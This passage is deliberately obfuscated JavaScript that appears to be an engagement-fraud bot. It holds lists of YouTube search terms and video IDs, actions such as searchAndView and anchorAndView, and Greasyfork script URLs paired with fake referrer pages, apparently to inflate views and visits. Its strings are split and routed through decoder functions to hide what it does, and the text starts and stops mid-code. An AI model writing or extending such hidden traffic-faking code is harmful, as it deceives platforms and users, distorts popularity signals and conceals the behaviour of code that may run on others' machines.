    let i = this[floor(random() * this['length'])];
    f[V(0x17, 'Y9R@')](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + U(0x0) + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0xa3f * 0x2 + -0x25cb + 0x3a53)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x1e2e * 0x1 + -0x3bc + 0xd * -0x208)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + W(0x12, 'fMGT') + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1f3 * 0x7 + 0x3ee + -0x10 * 0x119);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    X(0x4) + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    U(0x6) + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    U(0xc) + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    W(0x1d, 'nHsp') + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    W(0x1a, '$YWl') + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + W(0x1b, '^&aL'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + X(0xd) + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + X(0x16) + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': X(0x11) + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0xb) + W(0x1e, '[AkU') + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': W(0x8, 'xnxg') + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
